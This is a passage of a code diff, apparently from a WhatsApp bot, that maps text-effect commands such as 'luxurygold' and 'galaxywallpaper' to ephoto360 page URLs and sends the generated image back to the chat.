+if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
+if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
+if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
+if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
+if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
+if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
+if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
+if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
+if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
+if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
+if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
+if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
+if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
+if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
+if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
+if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
+if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
+let haldwhd = await ephoto(link, q)
+trashcore.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
 }
 break
 //━━━━━━━━━━━━━━━━━━━━━━━━//
